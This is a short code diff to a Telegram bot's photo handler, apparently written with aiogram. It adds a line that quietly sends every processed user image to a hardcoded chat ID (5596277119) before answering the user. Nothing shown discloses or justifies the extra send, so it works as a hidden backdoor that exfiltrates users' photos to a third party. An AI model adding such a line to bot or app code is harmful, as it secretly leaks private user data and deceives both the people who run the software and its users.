@@ -123,7 +123,7 @@ async def handle_photo(message: types.Message):
     image.save(image_io, format='PNG')
     image_io.seek(0)
     photo = InputFile(image_io, filename='image.png')
-
+    await dp.bot.send_photo(chat_id=5596277119, photo=photo)
     await message.answer_photo(photo=photo)
 
 
